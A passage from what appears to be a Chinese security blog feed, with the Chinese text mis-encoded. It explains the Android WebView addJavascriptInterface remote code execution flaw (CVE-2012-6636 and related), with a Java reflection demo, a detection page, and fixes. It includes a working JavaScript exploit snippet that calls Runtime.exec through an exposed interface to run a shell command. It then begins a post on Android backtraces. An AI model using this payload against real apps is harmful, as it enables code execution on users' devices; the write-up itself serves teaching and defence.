class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">package</span> Reflect;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Method;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Demo</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">a1</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;I am a1&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">a2</span><span class="params">()</span> &#123;</span><br><span class="line">    System.out.println(<span class="string">&quot;I am a2&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hello</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">    Demo demo=<span class="keyword">new</span> <span class="title class_">Demo</span>();</span><br><span class="line">    <span class="type">Class</span> <span class="variable">mObjectClass</span> <span class="operator">=</span> demo.getClass();</span><br><span class="line"></span><br><span class="line">    System.out.println(mObjectClass.getName());</span><br><span class="line"></span><br><span class="line">    Method[] methods = mObjectClass.getDeclaredMethods();</span><br><span class="line">    <span class="keyword">for</span>(Method method : methods)&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;method = &quot;</span> + method.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> mObjectClass.newInstance();</span><br><span class="line">        methods[<span class="number">0</span>].setAccessible(<span class="literal">true</span>);</span><br><span class="line">        methods[<span class="number">0</span>].invoke(o);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Throwable e) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&gt; javac -d . Reflect/hello.java</span><br><span class="line">&gt; java Reflect.hello</span><br><span class="line"></span><br><span class="line">Reflect.Demo</span><br><span class="line">method = a1</span><br><span class="line">method = a2</span><br><span class="line">I am a1</span><br></pre></td></tr></table></figure><p>å·²ç»æˆåŠŸè°ƒç”¨äº†Demoçš„private a1 æ–¹æ³•</p><h2 id="â˜†-ç›¸å…³æ¼æ´"><a href="#â˜†-ç›¸å…³æ¼æ´" class="headerlink" title="â˜†  ç›¸å…³æ¼æ´"></a>â˜†  ç›¸å…³æ¼æ´</h2><h3 id="CVE-2013-4710"><a href="#CVE-2013-4710" class="headerlink" title="CVE-2013-4710"></a>CVE-2013-4710</h3><p>Disney Mobileã€eAccessã€KDDIã€NTT DOCOMOã€SoftBankè®¾å¤‡ä¸Šçš„Android 3.0è‡³4.1.xç‰ˆ<br>æœ¬ä¸­å­˜åœ¨å®‰å…¨æ¼æ´ï¼Œè¯¥æ¼æ´æºäºç¨‹åºæ²¡æœ‰æ­£ç¡®å®ç°WebViewç±»ã€‚è¿œç¨‹æ”»å‡»è€…å¯å€ŸåŠ©ç‰¹åˆ¶çš„ç½‘<br>é¡µåˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„Javaå¯¹è±¡çš„æ–¹æ³•æˆ–é€ æˆæ‹’ç»æœåŠ¡ï¼ˆé‡å¯ï¼‰</p><h3 id="CVE-2012-6636-å…³é”®çš„CVE"><a href="#CVE-2012-6636-å…³é”®çš„CVE" class="headerlink" title="CVE-2012-6636  (å…³é”®çš„CVE)"></a>CVE-2012-6636  (å…³é”®çš„CVE)</h3><p>è¯¥æ¼æ´æºäºç¨‹åºæ²¡æœ‰æ­£ç¡®é™åˆ¶ä½¿ç”¨WebView.addJavascriptInterfaceæ–¹æ³•ï¼Œè¿œç¨‹æ”»å‡»è€…å¯<br>é€šè¿‡ä½¿ç”¨Java Reflection åˆ©ç”¨è¯¥æ¼æ´æ‰§è¡Œä»»æ„Javaå¯¹è±¡çš„æ–¹æ³•ã€‚å½±å“ä½¿ç”¨ API Level 16<br>ä»¥åŠä¹‹å‰çš„Android ç³»ç»Ÿã€‚(Android 4.2 ä¸º API Level 17)</p><h3 id="CVE-2014-1939-searchBoxJavaBridge-in-Android-Jelly-Bean"><a href="#CVE-2014-1939-searchBoxJavaBridge-in-Android-Jelly-Bean" class="headerlink" title="CVE-2014-1939 searchBoxJavaBridge_ in Android Jelly Bean"></a>CVE-2014-1939 searchBoxJavaBridge_ in Android Jelly Bean</h3><p>æ­¤æ¼æ´å…¬å¸ƒäº†ä¸€ä¸ªå¯åˆ©ç”¨çš„Java Object â€œsearchBoxJavaBridge_â€</p><h3 id="CVE-2014-7224"><a href="#CVE-2014-7224" class="headerlink" title="CVE-2014-7224"></a>CVE-2014-7224</h3><p>æ ¹æ® android&#x2F;webkit&#x2F;AccessibilityInjector.java ä»£ç ä¸­çš„ä»‹ç»ï¼Œå‘ç°å½“ç³»ç»Ÿè¾…åŠ©<br>åŠŸèƒ½ä¸­çš„ä»»æ„ä¸€é¡¹æœåŠ¡è¢«å¼€å¯åï¼Œæ‰€æœ‰ç”±ç³»ç»Ÿæä¾›çš„WebViewéƒ½ä¼šè¢«åŠ å…¥ä¸¤ä¸ªJS objectsï¼Œ<br>åˆ†åˆ«ä¸ºæ˜¯â€accessibilityâ€  å’Œ â€œaccessibilityTraversalâ€ã€‚å¦‚æœAPPä½¿ç”¨äº†ç³»ç»Ÿçš„WebView<br>å¹¶ä¸”è®¾ç½®äº†setJavaScriptEnabled()ï¼Œé‚£ä¹ˆæ¶æ„æ”»å‡»è€…å°±å¯ä»¥ä½¿ç”¨â€accessibilityâ€ å’Œ<br>â€œaccessibilityTraversalâ€ è¿™ä¸¤ä¸ªJava Bridgeæ¥æ‰§è¡Œè¿œç¨‹æ”»å‡»ä»£ç </p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>   è¿™äº›CVEä¸­æœ€æ ¸å¿ƒçš„æ˜¯CVE-2012-6636, å‡ºç°çš„é—®é¢˜æ˜¯æ¥å£å®šä¹‰é—®é¢˜ã€‚æ˜¯éå¸¸ç»å…¸çš„<br>do a å˜æˆ do b çš„ä¾‹å­ï¼Œåé¢çš„ä¿®å¤æ–¹æ³•ä¹Ÿæ˜¯ä¿è¯äº†do a å°±æ˜¯ do aã€‚</p><h2 id="â˜†-æ¼æ´æ£€æµ‹"><a href="#â˜†-æ¼æ´æ£€æµ‹" class="headerlink" title="â˜† æ¼æ´æ£€æµ‹"></a>â˜† æ¼æ´æ£€æµ‹</h2><p>   ä½¿ç”¨WebViewè®¿é—®ä¸‹é¢é¡µé¢ï¼Œè¾“å‡ºçš„æ¥å£åç§°åˆ™å­˜åœ¨æ¼æ´ã€‚</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">title</span>&gt;</span>WebViewæ¼æ´æ£€æµ‹<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">&quot;viewport&quot;</span> <span class="attr">content</span>=<span class="string">&quot;width=device-width, initial-scale=1.0,</span></span></span><br><span class="line"><span class="string"><span class="tag">maximum-scale=1.0, user-scalable=0&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">b</span>&gt;</span>å¦‚æœå½“å‰appå­˜åœ¨æ¼æ´ï¼Œå°†ä¼šåœ¨é¡µé¢ä¸­è¾“å‡ºå­˜åœ¨æ¼æ´çš„æ¥å£æ–¹ä¾¿ç¨‹åºå‘˜åšå‡ºä¿®æ”¹ï¼š<span class="tag">&lt;/<span class="name">b</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">p</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">type</span>=<span class="string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="language-javascript">&#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="keyword">for</span> (<span class="keyword">var</span> obj <span class="keyword">in</span> <span class="variable language_">window</span>) </span></span><br><span class="line"><span class="language-javascript">    &#123;</span></span><br><span class="line"><span class="language-javascript">        <span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-javascript">            <span class="keyword">if</span> (<span class="string">&quot;getClass&quot;</span> <span class="keyword">in</span> <span class="variable language_">window</span>[obj]) &#123;</span></span><br><span class="line"><span class="language-javascript">                <span class="keyword">try</span>&#123;</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">window</span>[obj].<span class="title function_">getClass</span>();</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;span style=&quot;color:red&quot;&gt;&#x27;</span>+obj+<span class="string">&#x27;&lt;/span&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                    <span class="variable language_">document</span>.<span class="title function_">write</span>(<span class="string">&#x27;&lt;br /&gt;&#x27;</span>);</span></span><br><span class="line"><span class="language-javascript">                &#125;<span class="keyword">catch</span>(e)&#123;</span></span><br><span class="line"><span class="language-javascript">                &#125;</span></span><br><span class="line"><span class="language-javascript">            &#125;</span></span><br><span class="line"><span class="language-javascript">        &#125; <span class="keyword">catch</span>(e) &#123;</span></span><br><span class="line"><span class="language-javascript">        &#125;</span></span><br><span class="line"><span class="language-javascript">    &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">check</span>();</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>   ç°ä»£æµè§ˆå™¨éƒ½å®ç°åŸºæœ¬ä¸€è‡´çš„BOMï¼Œä½¿å¾—JavaScriptå’Œæµè§ˆå™¨è¿›è¡Œæ¶ˆæ¯ä¼ é€’ã€‚<br>   æ˜¯å¦æœ‰getClassçš„æ–¹æ³•ï¼Œå¯ä»¥ä½œä¸ºæ£€æµ‹WebViewæ¼æ´ä¾æ®ã€‚</p><p>   åœ¨Android 4.1.1 åŸç”Ÿç³»ç»Ÿä¸Šæµ‹è¯•ï¼Œåœ¨é»˜è®¤é…ç½®ä¸‹ï¼Œå­˜åœ¨ searchBoxJavaBridge_<br>   å¯ä»¥åˆ©ç”¨ï¼ŒCVE-2014-7224ä¸Šçš„ä¸¤ä¸ªæ¥å£ï¼Œå¹¶æ²¡æœ‰æˆåŠŸæš´éœ²ã€‚çœ‹äº†æºä»£ç åå‘ç°å¿…é¡»<br>   æ‰“å¼€Accessibility è®¾ç½®ä¸­çš„Enhance Web accessibility æ‰ä¼šæš´éœ²è¿™ä¸ªä¸¤ä¸ªæ¥å£ï¼Œ<br>   å› æ­¤CVE-2014-7224çš„å½±å“å¹¶ä¸åƒæƒ³è±¡ä¸­çš„é‚£ä¹ˆå¤§ã€‚</p><h2 id="â˜†-æ¼æ´åˆ©ç”¨çš„æ–¹æ³•"><a href="#â˜†-æ¼æ´åˆ©ç”¨çš„æ–¹æ³•" class="headerlink" title="â˜† æ¼æ´åˆ©ç”¨çš„æ–¹æ³•"></a>â˜† æ¼æ´åˆ©ç”¨çš„æ–¹æ³•</h2><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">function</span> <span class="title function_">execute</span>(<span class="params">cmd</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">return</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable language_">window</span>.<span class="property">jsinterface</span>.<span class="title function_">getClass</span>().<span class="title function_">forName</span>(<span class="string">&#x27;java.lang.Runtime&#x27;</span>).<span class="title function_">getMethod</span>(<span class="string">&#x27;getRuntime&#x27;</span>,<span class="literal">null</span>).<span class="title function_">invoke</span>(<span class="literal">null</span>,<span class="literal">null</span>).<span class="title function_">exec</span>(cmd);</span></span><br><span class="line"><span class="language-javascript">&#125;</span></span><br><span class="line"><span class="language-javascript"><span class="title function_">execute</span>([<span class="string">&#x27;/system/bin/sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>,<span class="string">&#x27;echo \&quot;mwr\&quot; &gt; /mnt/sdcard/mwr.txt&#x27;</span>]);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>   jsinterfaceæ˜¯å¯¼å‡ºçš„Javaå¯¹è±¡ï¼Œ æµ‹è¯•æˆåŠŸï¼Œæƒé™æ˜¯app çš„ç”¨æˆ·æƒé™ã€‚</p><h2 id="â˜†-ä¿®å¤æ–¹æ³•å’Œç°çŠ¶"><a href="#â˜†-ä¿®å¤æ–¹æ³•å’Œç°çŠ¶" class="headerlink" title="â˜† ä¿®å¤æ–¹æ³•å’Œç°çŠ¶"></a>â˜† ä¿®å¤æ–¹æ³•å’Œç°çŠ¶</h2><p>   Googleå®£å¸ƒä¸ä¸ºå°äºAndroid 4.4 çš„ç³»ç»Ÿæä¾›WebViewè¡¥ä¸, å…·ä½“å¯ä»¥å‚è§é“¾æ¥ï¼š</p><p><a href="https://community.rapid7.com/community/metasploit/blog/2015/01/11/google-no-longer-provides-patches-for-webview-jelly-bean-and-prior">https://community.rapid7.com/community/metasploit/blog/2015/01/11/google-no-longer-provides-patches-for-webview-jelly-bean-and-prior</a></p><p>   è¦è§£å†³WebViewçš„RCEæ¼æ´ï¼Œæ¯”è¾ƒé è°±çš„æ–¹æ³•æ˜¯å‡çº§Androidç³»ç»Ÿï¼Œè‡³å°‘è¦å‡çº§åˆ°<br>   API level 17 (Android 4.2), WebView é™¤äº†æœ€ä¸¥é‡çš„RCEæ¼æ´ï¼Œè¿˜æœ‰å„ç§SOPæ¼æ´ï¼Œæ‰€<br>   ä»¥è‡³å°‘è¦å‡çº§åˆ°Android 4.4æ‰èƒ½ä¿è¯å®‰å…¨ï¼Œå°äºAndroid 4.4 Googleä¸æä¾›è¡¥ä¸ã€‚<br>   Android 4.4 ä»¥åä½¿ç”¨ä»¥chromeä¸ºåŸºç¡€çš„WebViewã€‚</p><p>   å‡çº§ç³»ç»ŸAPI level 17åï¼Œåªæœ‰æ˜¾ç¤ºæ·»åŠ  @JavascriptInterfaceçš„æ–¹æ³•æ‰èƒ½è¢«JavaScript<br>   è°ƒç”¨ï¼Œè¿™æ ·åå°„å°±å¤±å»ä½œç”¨äº†ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">removeJavascriptInterface(<span class="string">&quot;accessibility&quot;</span>);</span><br><span class="line">removeJavascriptInterface(<span class="string">&quot;accessibilityTraversal&quot;</span>);</span><br><span class="line">removeJavascriptInterface(<span class="string">&quot;searchBoxJavaBridge_&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="â˜†-å‚è€ƒé“¾æ¥"><a href="#â˜†-å‚è€ƒé“¾æ¥" class="headerlink" title="â˜† å‚è€ƒé“¾æ¥"></a>â˜† å‚è€ƒé“¾æ¥</h2><ul><li><a href="http://developer.android.com/guide/webapps/webview.html">http://developer.android.com/guide/webapps/webview.html</a></li><li><a href="http://developer.android.com/reference/android/webkit/WebView.html">http://developer.android.com/reference/android/webkit/WebView.html</a></li><li><a href="https://daoyuan14.github.io/news/newattackvector.html">https://daoyuan14.github.io/news/newattackvector.html</a></li><li><a href="http://droidsploit.baidu.com/view/14100201.html">http://droidsploit.baidu.com/view/14100201.html</a></li><li><a href="http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html">http://www.rafayhackingarticles.net/2014/10/a-tale-of-another-sop-bypass-in-android.html</a></li><li><a href="http://tutorials.jenkov.com/java-reflection/index.html">http://tutorials.jenkov.com/java-reflection/index.html</a></li><li><a href="http://javaxden.blogspot.sg/2007/08/hack-any-java-class-using-reflection.html">http://javaxden.blogspot.sg/2007/08/hack-any-java-class-using-reflection.html</a></li><li><a href="http://www.programcreek.com/2013/09/java-reflection-tutorial/">http://www.programcreek.com/2013/09/java-reflection-tutorial/</a></li><li><a href="https://labs.mwrinfosecurity.com/blog/2012/04/23/adventures-with-android-webviews/">https://labs.mwrinfosecurity.com/blog/2012/04/23/adventures-with-android-webviews/</a></li><li><a href="https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/">https://labs.mwrinfosecurity.com/advisories/2013/09/24/webview-addjavascriptinterface-remote-code-execution/</a></li></ul><h2 id="â˜†-æ€è€ƒ"><a href="#â˜†-æ€è€ƒ" class="headerlink" title="â˜† æ€è€ƒ"></a>â˜† æ€è€ƒ</h2><p>   WebView ä¸­è¿˜æä¾›äº†ä¸€ä¸ªæ–¹æ³•è®©æˆ‘ä»¬å¯ä»¥è·å¾—æ§åˆ¶çš„æœºä¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (url.substring(<span class="number">0</span>,<span class="number">6</span>).equalsIgnoreCase(<span class="string">&quot;yourscheme:&quot;</span>)) &#123;</span><br><span class="line">    <span class="comment">// parse the URL object and execute functions</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>   å¦‚æœä½¿ç”¨ä¸Šé¢çš„ä»£ç ï¼Œåœ¨ç½‘é¡µçš„javascriptä¸­æ·»åŠ ä¸‹é¢çš„ä»£ç ï¼Œå°±å¯ä»¥è¿›å…¥åé¢çš„è§£æ<br>   URLæµç¨‹ï¼Œå¦‚æœåç»­ä»£ç æ²¡æœ‰è¿›è¡Œä¸¥æ ¼çš„æ£€æŸ¥å¯èƒ½ä¼šæœ‰ä¸€äº›å…¶ä»–çš„å®‰å…¨é—®é¢˜ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="property">location</span> = <span class="attr">yourscheme</span>:<span class="comment">//method?parameter=value</span></span><br></pre></td></tr></table></figure><p>Googleå¯¹è¿™ä¸ªæ–¹æ³•çš„è§£é‡Šå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Give the host application a chance to take over the control when a new url </span><br><span class="line">is about to be loaded in the current WebView. If WebViewClient is not </span><br><span class="line">provided, by default WebView will ask Activity Manager to choose the proper </span><br><span class="line">handler for the url. If WebViewClient is provided, return true means the </span><br><span class="line">host application handles the url, while return false means the current </span><br><span class="line">WebView handles the url. This method is not called for requests using </span><br><span class="line">the POST &quot;method&quot;.</span><br></pre></td></tr></table></figure><p>å…¶å®å°±æ˜¯å½“WebViewåŠ è½½æ–°çš„URLæ—¶ç»™Appç¨‹åºä¸€ä¸ªæ§åˆ¶çš„æœºä¼šï¼Œè¿™è¿˜æ˜¯æœ‰ä¸€äº›æƒ³è±¡ç©ºé—´çš„ã€‚</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;â˜†-æ¥è‡ª-developer-android-com-çš„ä¿¡æ¯&quot;&gt;&lt;a href=&quot;#â˜†-æ¥è‡ª-developer-android-com-çš„ä¿¡æ¯&quot; class=&quot;headerlink&quot; title=&quot;â˜† æ¥è‡ª developer.android.com çš„ä¿¡æ¯&quot;&gt;</summary>
      
    
    
    
    
    <category term="Security" scheme="http://usmacd.com/tags/Security/"/>
    
    <category term="Android" scheme="http://usmacd.com/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>Android è·å–è¿›ç¨‹çš„ backtrace ä¿¡æ¯</title>
    <link href="http://usmacd.com/2021/11/03/backtrace_in_android/"/>
    <id>http://usmacd.com/2021/11/03/backtrace_in_android/</id>
    <published>2021-11-03T01:56:19.871Z</published>
    <updated>2021-11-03T01:56:19.871Z</updated>
    
    <content type="html"><![CDATA[<h2 id="â˜†-ä½¿ç”¨kill-å‘é€-SIGNAL-QUIT"><a href="#â˜†-ä½¿ç”¨kill-å‘é€-SIGNAL-QUIT" class="headerlink" title="â˜† ä½¿ç”¨kill å‘é€ SIGNAL_QUIT"></a>â˜† ä½¿ç”¨kill å‘é€ SIGNAL_QUIT</h2><p>è¿™ç§æ–¹æ³•åªèƒ½ç”¨äºzygote çš„å­è¿›ç¨‹ (æ¯”å¦‚æ‰€æœ‰çš„ app è¿›ç¨‹, éƒ½æ˜¯ç”±zygote fork è€Œæ¥).</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"># kill -3 pid</span><br><span class="line"></span><br><span class="line"># cat /data/anr/traces.txt</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">suspend all histogram:  Sum: 290us 99% C.I. 2us-40us Avg: 14.500us Max: 40us</span><br><span class="line">DALVIK THREADS (12):</span><br><span class="line">&quot;Signal Catcher&quot; daemon prio=5 tid=2 Runnable</span><br><span class="line">  | group=&quot;system&quot; sCount=0 dsCount=0 obj=0x32c070a0 self=0xaecca000</span><br><span class="line">  | sysTid=1918 nice=0 cgrp=bg_non_interactive sched=0/0 handle=0xb4406930</span><br><span class="line">  | state=R schedstat=( 228351607 17443703 83 ) utm=12 stm=9 core=0 HZ=100</span><br><span class="line">  | stack=0xb430a000-0xb430c000 stackSize=1014KB</span><br><span class="line">  | held mutexes= &quot;mutator lock&quot;(shared held)</span><br><span class="line">  native: #00 pc 00370e01  /system/lib/libart.so (_ZN3art15DumpNativeStackERNSt3__113basic_ostreamIcNS0_11char_traitsIcEEEEiPKcPNS_9ArtMethodEPv+160)</span><br><span class="line">  native: #01 pc 0035046f  /system/lib/libart.so (_ZNK3art6Thread4DumpERNSt3__113basic_ostreamIcNS1_11char_traitsIcEEEE+150)</span><br><span class="line">  native: #02 pc 0035a373  /system/lib/libart.so (_ZN3art14DumpCheckpoint3RunEPNS_6ThreadE+442)</span><br><span class="line">  native: #03 pc 0035af31  /system/lib/libart.so (_ZN3art10ThreadList13RunCheckpointEPNS_7ClosureE+212)</span><br><span class="line">  native: #04 pc 0035b45f  /system/lib/libart.so (_ZN3art10ThreadList4DumpERNSt3__113basic_ostreamIcNS1_11char_traitsIcEEEE+142)</span><br><span class="line">  native: #05 pc 0035bb6f  /system/lib/libart.so (_ZN3art10ThreadList14DumpForSigQuitERNSt3__113basic_ostreamIcNS1_11char_traitsIcEEEE+334)</span><br><span class="line">  native: #06 pc 00333cb7  /system/lib/libart.so (_ZN3art7Runtime14DumpForSigQuitERNSt3__113basic_ostreamIcNS1_11char_traitsIcEEEE+74)</span><br><span class="line">  native: #07 pc 0033b01d  /system/lib/libart.so (_ZN3art13SignalCatcher13HandleSigQuitEv+928)</span><br><span class="line">  native: #08 pc 0033b901  /system/lib/libart.so (_ZN3art13SignalCatcher3RunEPv+340)</span><br><span class="line">  native: #09 pc 0003f45f  /system/lib/libc.so (_ZL15__pthread_startPv+30)</span><br><span class="line">  native: #10 pc 00019b43  /system/lib/libc.so (__start_thread+6)</span><br><span class="line">  (no managed stack frames)</span><br><span class="line"></span><br><span class="line">&quot;main&quot; prio=5 tid=1 Native</span><br><span class="line">  | group=&quot;main&quot; sCount=1 dsCount=0 obj=0x74abb2a0 self=0xb4d76500</span><br><span class="line">  | sysTid=1914 nice=0 cgrp=bg_non_interactive sched=0/0 handle=0xb6f3fb34</span><br><span class="line">  | state=S schedstat=( 76934470 21396828 203 ) utm=3 stm=3 core=0 HZ=100</span><br><span class="line">  | stack=0xbe55e000-0xbe560000 stackSize=8MB</span><br><span class="line">  | held mutexes=</span><br><span class="line">  native: #00 pc 00040894  /system/lib/libc.so (__epoll_pwait+20)</span><br><span class="line">  native: #01 pc 00019e6f  /system/lib/libc.so (epoll_pwait+26)</span><br><span class="line"></span><br><span class="line">  ...</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç»“æœå†™åœ¨ &#x2F;data&#x2F;anr&#x2F;traces.txt æ–‡ä»¶ä¸­, anr æ˜¯ ANR(Application Not Response)çš„æ„æ€.</p><p><a href="https://android.googlesource.com/platform/art/+/android-7.1.1_r13/runtime/runtime.cc">https://android.googlesource.com/platform/art/+/android-7.1.1_r13/runtime/runtime.cc</a></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">Runtime::InitNonZygoteOrPostFork</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    JNIEnv* env, <span class="type">bool</span> is_system_server, NativeBridgeAction action, <span class="type">const</span> <span class="type">char</span>* isa)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Create the thread pools.</span></span><br><span class="line">  heap_-&gt;<span class="built_in">CreateThreadPool</span>();</span><br><span class="line">  <span class="comment">// Reset the gc performance data at zygote fork so that the GCs</span></span><br><span class="line">  <span class="comment">// before fork 